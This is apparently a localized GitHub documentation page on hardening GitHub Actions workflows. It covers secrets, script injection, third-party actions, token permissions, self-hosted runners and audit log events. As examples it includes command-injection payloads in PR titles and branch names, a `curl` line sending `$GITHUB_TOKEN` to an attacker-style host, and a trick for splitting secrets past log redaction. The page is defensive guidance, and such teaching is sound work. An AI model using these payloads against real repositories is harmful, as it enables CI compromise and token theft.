---
title: GitHub Actions 的安全强化
shortTitle: 安全强化
intro: '使用 {% data variables.product.prodname_actions %} 功能的良好安全实践。'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
---

{% data reusables.actions.enterprise-beta %}
{% data reusables.actions.enterprise-github-hosted-runners %}

## 概览

本指南介绍如何为某些 {% data variables.product.prodname_actions %} 功能配置安全强化。 如果不熟悉 {% data variables.product.prodname_actions %} 概念，请参阅“[GitHub 操作的核心概念](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)”。

## 使用密码

敏感值绝不能以明文存储在工作流程文件中，而应存储为密码。 [Secrets](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) can be configured at the organization, repository, or environment level, and allow you to store sensitive information in {% data variables.product.product_name %}.

密码使用 [Libsodium 密封箱](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes)，以使它们在到达 {% data variables.product.product_name %} 前被加密处理。 [使用 UI](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) 或通过 [REST API](/rest/reference/actions#secrets) 提交密码时就会发生这种情况。 此客户端加密有助于最大程度地减少与 {% data variables.product.product_name %}基础架构中的意外日志记录相关的风险（例如，异常日志和请求日志等）。 密钥在上传后，{% data variables.product.product_name %} 可对其进行解密，以便它能够被注入工作流程运行时。

为了帮助防止意外泄露，{% data variables.product.product_name %} 使用一种机制尝试对运行日志中显示的任何密码进行编校。 此编校会寻找任何已配置密码的精确匹配项，以及值的常见编码，如 Base64。 但是，由于密码值可以通过多种方式转换，因此不能保证此编校。 因此，你应该采取某些积极主动的步骤和良好的做法，以帮助确保密码得到编校， 并限制与密码相关的其他风险：

- **切勿将结构化数据用作密码**
    - 结构化数据可能导致日志中的密码编校失败，因为编校很大程度上取决于查找特定密码值的完全匹配项。 例如，不要使用 JSON、XML 或 YAML（或类似）的 Blob 来封装密码值，否则会显著降低密码被正确编校的可能性。 而应为每个敏感值创建单独的密码。
- **注册工作流程中使用的所有密码**
    - 如果密码用于生成工作流程中的另一个敏感值，则该生成的值应正式[注册为密码](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)，使其出现在日志中时将会得到编校。 例如，如果使用私钥生成签名的 JWT 来访问 Web API，请确保将该 JWT 注册为密码，否则，如果它进入日志输出，则不会得到编校。
    - 注册密码也适用于任何类型的转换/编码。 如果以某种方式（如 Base64 或 URL 编码）转换您的密码，请确保将新值也注册为密码。
- **审核如何处理密码**
    - 审核密码的使用方式，以帮助确保按预期方式处理密码。 您可以通过检查执行工作流程的仓库的源代码并检查工作流程中使用的任何操作来进行审核。 例如，确认它们未发送到非预期主机，或明确打印到日志输出。
    - 在测试有效/无效输入后查看工作流程的运行日志，并确认密码已正确编校或未显示。 您调用的命令或工具如何向 `STDOUT` 和 `STDERR` 发送错误并不总是很明显，密码随后可能会在错误日志中生成错误。 因此，在测试有效和无效的输入后，最好是手动查看工作流程日志。
- **使用最小范围的凭据**
    - 确保工作流程中使用的凭据具有所需的最小权限，并请注意，任何对仓库具有写入权限的用户都可访问仓库中配置的所有密码。 {% ifversion fpt or ghes > 3.1 or ghae or ghec %}
    - Actions 可以使用 `GITHUB_TOKEN` 从 `github.token` 上下文访问它。 更多信息请参阅“[上下文](/actions/learn-github-actions/contexts#github-context)”。 因此，您应该确保 `GITHUB_TOKEN` 获得所需的最低权限。 将 `GITHUB_TOKENN` 的默认权限设置为只读取仓库内容是良好的安全做法。 然后可以根据需要增加工作流程文件中个别任务的权限。 更多信息请参阅“[工作流程中的身份验证](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)。 {% endif %}
- **审核并轮换注册密码**
    - 定期查查已注册的密码，以确认它们仍是必需的。 删除不再需要的密码。
    - 定期轮换密码，以减小泄露的密码有效的时间窗。
- **考虑要求对访问密码进行审查**
    - 您可以使用所需的审查者来保护环境机密。 在审查者批准之前，工作流程作业无法访问环境机密。 For more information about storing secrets in environments or requiring reviews for environments, see "[Encrypted secrets](/actions/reference/encrypted-secrets)" and "[Using environments for deployment](/actions/deployment/using-environments-for-deployment)."

## 使用 `CODEOWNERS` 监控更改

您可以使用 `CODEOWNERS` 功能来控制如何更改您的工作流程文件。 例如，如果您所有的工作流程文件都存储在 `.github/workflows` 中，您可以将此目录添加到代码所有者列表，这样对这些文件的任何拟议更改都首先需要得到指定的审查者的批准。

更多信息请参阅“[关于代码所有者](/github/creating-cloning-and-archiving-repositories/about-code-owners)”。

## 了解脚本注入的风险

在创建工作流程 [custom actions](/actions/creating-actions/about-actions) 和 [composite actions](/actions/creating-actions/creating-a-composite-action) 操作时，您应该始终考虑您的代码是否会执行来自攻击者的不信任输入。 当攻击者将恶意命令和脚本添加到上下文时可能发生这种情况。 当您的工作流程运行时，这些字符串可能会被解释为代码，然后在运行器上执行。

 攻击者可以将他们自己的恶意内容添加到 [`github` 上下文](/actions/reference/context-and-expression-syntax-for-github-actions#github-context)中，应会该被视为潜在的不可信输入。 这些上下文通常以 `body`、`default_branch`、`email`、`head_ref`、`label`、`message`、`name`、`page_name`、`ref` 和 `title` 结束。  例如：`github.event.issue.title` 或 `github.event.pull_request.body`。

 您应该确保这些值不会直接流入工作流程、操作、API 调用，或任何可能被解释为可执行代码的其它地方。 通过采用您将用于任何其他特权应用程序代码的相同防御编程姿态，，您可以帮助安全保护 {% data variables.product.prodname_actions %} 的使用。 有关攻击者可能采取的某些步骤的信息，请参阅“[受损运行器的潜在影响](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)”。

此外，还有其他不太明显的潜在不信任输入来源，如分支名称和电子邮件地址，这些输入在允许的内容方面可能相当灵活。 例如， `zz";echo${IFS}"hello";#` 将是一个有效的分支名称，并将成为目标仓库的可能攻击矢量。

以下部分解释了如何帮助降低脚本注入的风险。

### 脚本注入攻击示例

脚本注入攻击可直接发生在工作流程的内联脚本中。 在下列示例中，操作使用表达式来测试拉取请求标题的有效性，但也增加了脚本注入的风险：

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

此示例易受脚本注入的影响，因为 `run` 命令在运行器的临时 shell 脚本中执行。 在 shell 脚本运行之前。 {% raw %}`${{ }}`{% endraw %} 内的表达式被评估后替换为结果值， 这使它易受 shell 命令注入的攻击。

要将命令注入此工作流程，攻击者可以创建标题为 `a"; ls $GITHUB_WORKSPACE"` 的拉取请求：

![PR 标题中的脚本注入示例](/assets/images/help/images/example-script-injection-pr-title.png)

在此示例中，`"` 字符用于中断 {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} 语句， 允许在运行器上执行 `ls` 命令。 您可以在日志中看到 `ls` 命令的输出：

![脚本注入示例结果](/assets/images/help/images/example-script-injection-result.png)

## 减少脚本注入攻击的良好做法

有许多不同的方法可以帮助您降低脚本注入的风险：

### 使用操作而不是内联脚本（建议）

建议的方法是创建一个操作，将上下文值作为参数处理。 此方法不易受到注入攻击，因为上下文值不用于生成 shell 脚本，而是作为参数传递给该操作：

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### 使用中间环境变量

对于内联脚本，处理不信任输入的首选方法是将表达式的值设置为中间环境变量。

以下示例使用 Bash 将 `github.event.pull_request.title` 值处理为环境变量：

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

在此示例中，尝试的脚本注入失败：

![缓减脚本注入示例](/assets/images/help/images/example-script-injection-mitigated.png)

使用此方法， {% raw %}`${{ github.event.issue.title }}`{% endraw %} 表达式的值存储在内存中用作变量，并且不与脚本生成过程交互。 此外，考虑使用双引号 shell 变量来避免 [单词拆分](https://github.com/koalaman/shellcheck/wiki/SC2086)，但这是是写入shell 脚本[的许多一般性建议之一](https://mywiki.wooledge.org/BashPitfalls)，不是专门针对 {% data variables.product.prodname_actions %} 的。

{% ifversion fpt or ghec %}
### Using starter workflows for code scanning

{% data reusables.advanced-security.starter-workflows-beta %}
{% data variables.product.prodname_code_scanning_capc %} allows you to find security vulnerabilities before they reach production. {% data variables.product.product_name %} provides starter workflows for {% data variables.product.prodname_code_scanning %}. You can use these suggested workflows to construct your {% data variables.product.prodname_code_scanning %} workflows, instead of starting from scratch. {% data variables.product.company_short%}'s workflow, the {% data variables.product.prodname_codeql_workflow %}, is powered by {% data variables.product.prodname_codeql %}. There are also third-party starter workflows available.

For more information, see "[About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" and "[Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)."

{% endif %}

### 限制令牌权限

为了帮助降低暴露令牌的风险，请考虑限制分配的权限。 更多信息请参阅“[修改 GITHUB_TOKEN 的权限](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)”。

{% ifversion fpt or ghec or ghae-issue-4856 %}

## Using OpenID Connect to access cloud resources

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## 使用第三方操作

工作流程中的个别作业可以与其他作业相互作用（和妥协）。 例如，查询以后作业使用的环境变量，将文件写入以后作业处理的共享目录，或者更直接地与 Docker 套接字接交互，以及检查其他正在运行的容器并执行其中的命令。

这意味着工作流程中单一操作的泄露可能很严重，因为这个泄露的操作可以访问您仓库中配置的所有密码， 并且可以使用 `GITHUB_TOKENN` 写入仓库。 因此，从 {% data variables.product.prodname_dotcom %} 上的第三方仓库获取操作的风险很大。 有关攻击者可能采取的某些步骤的信息，请参阅“[受损运行器的潜在影响](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)”。

您可以遵循以下良好做法来帮助降低此风险：

* **将操作固定到全长提交 SHA**

  将操作固定到全长提交 SHA 是当前将操作用作不可变版本的唯一方法。 固定到特定 SHA 有助于降低恶意执行者向操作仓库添加后门的风险，因为他们需要为有效的 Git 对象负载生成 SHA-1 冲突。



* **审核操作的源代码**

  确保操作按照预期处理仓库和密码的内容。 例如，确认密码未发送到非预期主机，或者没有被无意中记录。

* **仅当您信任创建者时，才将操作固定到标记**

  尽管固定到提交 SHA 是最安全的选项，但指定标记更方便，而且被广泛使用。 如果要指定标记，请确保信任该操作的创建者。 {% data variables.product.prodname_marketplace %} 上的“已验证创建者”徽章是一个有用的信号，因为它表示该操作是由其身份已被 {% data variables.product.prodname_dotcom %} 验证的团队编写的。 请注意，即使您信任作者，这种方法也存在风险，因为如果恶意执行者获得对存储操作的仓库的访问权限，便可移动或删除标记。

{% ifversion fpt or ghes > 3.3 or ghae-issue-4757 or ghec %}
## Reusing third-party workflows

The same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see "[Reusing workflows](/actions/learn-github-actions/reusing-workflows)."
{% endif %}

{% if internal-actions %}
## Allowing workflows to access internal repositories

{% data reusables.actions.outside-collaborators-internal-actions %} For more information, see "[Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)."
{% endif %}

## Using OpenSSF Scorecards to secure workflows

[Scorecards](https://github.com/ossf/scorecard) is an automated security tool that flags risky supply chain practices. You can use the [Scorecards action](https://github.com/marketplace/actions/ossf-scorecard-action) and [starter workflow](https://github.com/actions/starter-workflows) to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.

## 受损运行器的潜在影响

这些部分考虑了当攻击者能够对 {% data variables.product.prodname_actions %} 运行器运行恶意命令时可以采取的一些步骤。

### 访问密钥

使用 `pull_request` 事件触发的工作流程具有只读权限，不能访问密钥。 但是，这些权限因各种事件触发因素（如 `issue_comment`、`issues` 和 `push`）而有所不同，攻击者可能试图窃取仓库机密或使用作业 [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) 的写入权限。

- 如果密钥或令牌设置为环境变量，它可以使用 `printenv` 通过环境直接访问。
- 如果在表达式中直接使用密钥，生成的 shell 脚本将存储在磁盘上，并且可以访问。
- 对于自定义操作，风险可能因程序如何使用从参数中获取的密钥而异：

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

虽然 {% data variables.product.prodname_actions %} 会从工作流程（或包含的操作）中未引用的内存中清除密钥，但 `GITHUB_TOKEN` 和任何引用的密钥均可被坚定的攻击者获取。

### 泄露运行器中的数据

攻击者可以从运行器泄露任何被盗的密钥或其他数据。 为了帮助防止意外的密钥泄露，{% data variables.product.prodname_actions %} [自动编辑打印到日志的密钥](/actions/reference/encrypted-secrets#accessing-your-secrets)，但这不是一个真正的安全边界，因为密钥可以故意发送到日志。 例如，可使用 `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};` 来解析混淆的密钥。 此外，由于攻击者可能运行任意命令，他们可以使用 HTTP 请求将机密或其他仓库数据发送到外部服务器。

### 窃取作业的 `GITHUB_TOKEN`

攻击者有可能窃取作业的 `GITHUB_TOKEN`。 {% data variables.product.prodname_actions %} 运行器自动接收生成的 `GITHUB_TOKEN`，权限仅限于包含工作流程的仓库，令牌在作业完成后过期。 一旦过期，令牌对攻击者不再有用。 为了解决此限制，他们可以通过调用带有令牌的攻击者控制的服务器（例如：`a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#`）来自动执行攻击并在几分之一秒内完成攻击。

### 修改仓库的内容

The attacker server can use the {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API to [modify repository content](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## 考虑跨仓库访问

{% data variables.product.prodname_actions %} is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file{% ifversion fpt or ghes > 3.1 or ghae or ghec %}, elevating the permissions of the `GITHUB_TOKEN` if necessary{% endif %}. 用户对每个仓库都有特定权限，因此，如果不谨慎实施，一个仓库的 `GITHUB_TOKEN` 库授予对另一个仓库的访问权限将会影响 {% data variables.product.prodname_dotcom %} 权限模型。 同样，在向工作流程添加 {% data variables.product.prodname_dotcom %} 授权令牌时也必须谨慎，因为这也会因无意中向协作者授予一般权限而影响 {% data variables.product.prodname_dotcom %} 权限模型。

我们已经[制定 {% data variables.product.prodname_dotcom %} 路线图](https://github.com/github/roadmap/issues/74)，以支持允许在 {% data variables.product.product_name %} 内跨仓库访问的流程，但这还不是一项受支持的功能。 目前，执行特权跨仓库交互的唯一方法就是将 {% data variables.product.prodname_dotcom %} 身份验证令牌或 SSH 密钥作为工作流程中的密码。 由于许多身份验证令牌类型不允许对特定资源进行细致的访问，因此使用错误的令牌类型存在很大风险，因为它可以授予比预期范围更广泛的访问。

此列表描述建议用于在工作流程中访问仓库数据的方法，按优先顺序降序排列：

1. **`GITHUB_TOKEN`**
    -  此令牌被故意扩展到单个调用工作流程的仓库，并且{% ifversion fpt or ghes > 3.1 or ghae or ghec %}可以有 {% else %}具有 {% endif %}与仓库的写入用户相同的访问权限。 令牌在每个作业开始之前创建，在作业完成时过期。 更多信息请参阅“[使用 GITHUB_TOKEN 验证身份](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)”。
    - 应尽可能使用 `GITHUB_TOKEN`。
2. **仓库部署密钥**
    - 部署密钥是唯一授予对单个存储库的读取或写入访问权限的凭据类型之一，可用于与工作流程中的另一个仓库进行交互。 更多信息请参阅“[管理部署密钥](/developers/overview/managing-deploy-keys#deploy-keys)”。
    - 请注意，部署密钥只能使用 Git 克隆和推送到仓库，不能用于与 REST 或 GraphQL API 进行交互，因此它们可能不适合您的要求。
3. **{% data variables.product.prodname_github_app %} 令牌**
    - {% data variables.product.prodname_github_apps %} 可以安装在选择的仓库上，甚至可以对其中的资源设置细致的访问权限。 您可以创建组织内部的 {% data variables.product.prodname_github_app %}，将其安装在工作流程中您需要访问的仓库上，并在工作流程中验证为安装以访问这些仓库。
4. **个人访问令牌**
    - 切勿使用您自己帐户的个人访问令牌。 这些令牌授予您访问组织中您有权访问的所有仓库，以及您的用户帐户中的所有个人仓库。 这间接地向所有能写入工作流程所在仓库的用户授予广泛访问权限。 此外，如果您以后离开组织，使用此令牌的工作流程将立即中断，而且调试此问题可能具有挑战性。
    - 如果使用个人访问令牌，应是为新帐户生成的令牌，该帐户仅被授予对工作流程所需的特定仓库的访问权限。 请注意，此方法不可扩展，应避免采用其他方法，例如部署密钥。
5. **用户帐户上的 SSH 密钥**
    - 工作流程不应使用用户帐户上的 SSH 密钥。 与个人访问令牌类似，它们授予对所有个人仓库以及通过组织成员资格访问的所有仓库的读/写权限。  这间接地向所有能写入工作流程所在仓库的用户授予广泛访问权限。 如果您打算使用 SSH 密钥，因为您只需要执行仓库克隆或推送，并且不需要与公共 API 交互，则应该使用单独的部署密钥。

## 自托管运行器的强化

{% ifversion fpt or ghec %}
**{% data variables.product.prodname_dotcom %} 托管的**运行程序在临时和干净的隔离虚拟机中执行代码，这意味着无法持续破坏此环境，可以访问的信息不会超过引导过程中此环境中存在的信息。
{% endif %}

{% ifversion fpt or ghec %}**Self-hosted**{% elsif ghes or ghae %}Self-hosted{% endif %} runners for {% data variables.product.product_name %} do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.

{% ifversion fpt or ghec %}As a result, self-hosted runners should almost [never be used for public repositories](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories) on {% data variables.product.product_name %}, because any user can open pull requests against the repository and compromise the environment. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which{% ifversion fpt or ghes > 3.1 or ghae or ghec %}, depending on its settings, can grant {% else %} grants {% endif %}write access to the repository. 尽管工作流程可以通过使用环境和必需的审查来控制对环境密钥的访问，但是这些工作流程不是在隔离的环境中运行，在自托管运行程器上运行时仍然容易遭受相同的风险。

在组织或企业级别定义自托管运行器时， {% data variables.product.product_name %} 可将多个仓库中的工作流程安排到同一个运行器中。 因此，这些环境的安全危害可能会导致广泛的影响。 为了帮助缩小损害范围，可以通过将自托管运行器组织到单独的组中来创建边界。 更多信息请参阅“[使用组管理对自托管运行器的访问](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)”。

您还应考虑自托管运行器机器的环境：
- 配置为自托管运行器的计算机上存储哪些敏感信息？ 例如，私有 SSH 密钥、API 访问令牌等。
- 计算机是否可通过网络访问敏感服务？ 例如，Azure 或 AWS 元数据服务。 此环境中的敏感信息量应保持在最低水平，您应该始终注意，任何能够调用工作流程的用户都有权访问此环境。

某些客户可能会尝试通过实施在每次作业执行后自动销毁自托管运行器的系统来部分降低这些风险。 但是，此方法可能不如预期有效，因为无法保证自托管运行器只运行一个作业。 有些任务将使用密钥作为命令行参数，可以在同一运行器上的另一个任务中看到，例如 `ps x -w`。 这可能导致秘密泄露。

### Planning your management strategy for self-hosted runners

A self-hosted runner can be added to various levels in your {% data variables.product.prodname_dotcom %} hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:

**Centralized management:**
  - If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.
  - If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.

**Decentralized management:**
  - If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.
  - You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.

{% ifversion fpt or ghec or ghae-issue-4856 %}
### Authenticating to your cloud provider

If you are using {% data variables.product.prodname_actions %} to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see "[About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)."

{% endif %}

## 审核 {% data variables.product.prodname_actions %} 事件

您可以使用审核日志来监控组织中的管理任务。 审核日志记录操作类型、操作的运行时间以及执行操作的用户帐户。

例如，您可以使用审核日志跟踪 `org.update_actions_secret` 事件，这些事件跟踪组织秘密的变化： ![审核日志条目](/assets/images/help/repository/audit-log-entries.png)

以下表格描述了您可以在审核日志中找到的 {% data variables.product.prodname_actions %} 事件。 有关使用审核日志的更多信息，请参阅“[查看组织的审核日志](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)”。

{% ifversion fpt or ghec %}
### 环境事件

| 操作                                  | 描述                                                                                   |
| ----------------------------------- | ------------------------------------------------------------------------------------ |
| `environment.create_actions_secret` | 在环境中创建机密时触发。 更多信息请参阅“[环境机密](/actions/reference/environments#environment-secrets)”。   |
| `environment.delete`                | 当环境被删除时触发。 更多信息请参阅“[删除环境](/actions/reference/environments#deleting-an-environment)”。 |
| `environment.remove_actions_secret` | 从环境中删除机密时触发。 更多信息请参阅“[环境机密](/actions/reference/environments#environment-secrets)”。   |
| `environment.update_actions_secret` | 当环境中的机密更新时触发。 更多信息请参阅“[环境机密](/actions/reference/environments#environment-secrets)”。  |
{% endif %}

{% ifversion fpt or ghes or ghec %}
### 配置更改事件
| 操作                     | 描述                                                                                                                                              |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `repo.actions_enabled` | 为仓库启用 {% data variables.product.prodname_actions %} 时触发。 可以使用用户界面查看。 当您使用 REST API 访问审计日志时，此事件不可见。 更多信息请参阅“[使用 REST API](#using-the-rest-api)”。 |
{% endif %}

### 机密管理的事件
| 操作                           | 描述                                                                                                                                                                    |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `org.create_actions_secret`  | 为组织创建 {% data variables.product.prodname_actions %} 机密时触发。 更多信息请参阅“[为组织创建加密密码](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)”。 |
| `org.remove_actions_secret`  | 当 {% data variables.product.prodname_actions %} 密码被移除时触发。                                                                                                             |
| `org.update_actions_secret`  | 在 {% data variables.product.prodname_actions %} 密码更新时触发。                                                                                                              |
| `repo.create_actions_secret` | 为仓库创建 {% data variables.product.prodname_actions %} 密码时触发。 更多信息请参阅“[为仓库创建加密密码](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)”。    |
| `repo.remove_actions_secret` | 当 {% data variables.product.prodname_actions %} 密码被移除时触发。                                                                                                             |
| `repo.update_actions_secret` | 在 {% data variables.product.prodname_actions %} 密码更新时触发。                                                                                                              |

### 自托管运行器的事件
| 操作                                        | 描述                                                                                                                                                                                                                                                                                                                            |
| ----------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.register_self_hosted_runner`  | 在注册新的自托管运行器时触发。 更多信息请参阅“[将自托管运行器添加到企业](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)”。                                                                                                                                                                           |
| `enterprise.remove_self_hosted_runner`    | 当自托管运行器被移除时触发。                                                                                                                                                                                                                                                                                                                |
| `enterprise.runner_group_runners_updated` | 当运行器组成员列表更新时触发。 更多信息请参阅“[为组织设置组中的自托管运行器](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)”。{% ifversion fpt or ghes > 3.1  or ghae or ghec %}
| `enterprise.self_hosted_runner_online`    | 当运行器应用程序启动时触发。 只能使用 REST API 查看；在 UI 或 JSON/CSV 导出中不可见。 更多信息请参阅“[检查自托管运行器的状态](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”。                                                                                                             |
| `enterprise.self_hosted_runner_offline`   | 当运行器应用程序停止时触发。 只能使用 REST API 查看；在 UI 或 JSON/CSV 导出中不可见。 更多信息请参阅“[检查自托管运行器的状态](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”。{% endif %}
| `enterprise.self_hosted_runner_updated`   | 当运行器应用程序更新时触发。 可以使用 REST API 和 UI 查看。 当您将审核日志导出为 JSON 数据或 CSV 文件时，此事件不包括在内。 更多信息请参阅“[关于自托管的运行器](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”和“[审查组织的审核日志](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)”。 |
| `org.register_self_hosted_runner`         | 在注册新的自托管运行器时触发。 更多信息请参阅“[将自托管运行器添加到组织](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)”。                                                                                                                                                                         |
| `org.remove_self_hosted_runner`           | 当自托管运行器被移除时触发。 更多信息请参阅“[从组织移除运行器](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization)”。                                                                                                                                                                                    |
| `org.runner_group_runners_updated`        | 当运行器组成员列表更新时触发。 更多信息请参阅“[为组织设置组中的自托管运行器](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)”。                                                                                                                                                                                                    |
| `org.runner_group_updated`                | 当自托管运行器组的配置改变时触发。 更多信息请参阅“[更改自托管运行器组的访问策略](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”。{% ifversion fpt or ghes > 3.1 or ghae or ghec %}
| `org.self_hosted_runner_online`           | 当运行器应用程序启动时触发。 只能使用 REST API 查看；在 UI 或 JSON/CSV 导出中不可见。 更多信息请参阅“[检查自托管运行器的状态](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”。                                                                                                             |
| `org.self_hosted_runner_offline`          | 当运行器应用程序停止时触发。 只能使用 REST API 查看；在 UI 或 JSON/CSV 导出中不可见。 更多信息请参阅“[检查自托管运行器的状态](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”。{% endif %}
| `org.self_hosted_runner_updated`          | 当运行器应用程序更新时触发。 可以使用 REST API 和 UI 查看；在 JSON /CSV 导出中不可见。 更多信息请参阅“[关于自托管运行器](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”。                                                                                                                                                          |
| `repo.register_self_hosted_runner`        | 在注册新的自托管运行器时触发。 更多信息请参阅“[将自托管运行器添加到仓库](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)”。                                                                                                                                                                            |
| `repo.remove_self_hosted_runner`          | 当自托管运行器被移除时触发。 更多信息请参阅“[从仓库删除运行器](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)”。{% ifversion fpt or ghes > 3.1 or ghae or ghec %}
| `repo.self_hosted_runner_online`          | 当运行器应用程序启动时触发。 只能使用 REST API 查看；在 UI 或 JSON/CSV 导出中不可见。 更多信息请参阅“[检查自托管运行器的状态](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”。                                                                                                             |
| `repo.self_hosted_runner_offline`         | 当运行器应用程序停止时触发。 只能使用 REST API 查看；在 UI 或 JSON/CSV 导出中不可见。 更多信息请参阅“[检查自托管运行器的状态](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”。{% endif %}
| `repo.self_hosted_runner_updated`         | 当运行器应用程序更新时触发。 可以使用 REST API 和 UI 查看；在 JSON /CSV 导出中不可见。 更多信息请参阅“[关于自托管运行器](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”。                                                                                                                                                          |

### 自托管运行器组的事件
| 操作                                       | 描述                                                                                                                                                                                           |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.runner_group_created`        | 在创建自托管运行器组时触发。 更多信息请参阅“[为企业创建自托管运行器组](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)”。         |
| `enterprise.runner_group_removed`        | 当自托管运行器组被移除时触发。 更多信息请参阅“[移除自托管运行器组](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)”。                             |
| `enterprise.runner_group_runner_removed` | 当 REST API 用于从组中删除自托管运行器时触发。                                                                                                                                                                 |
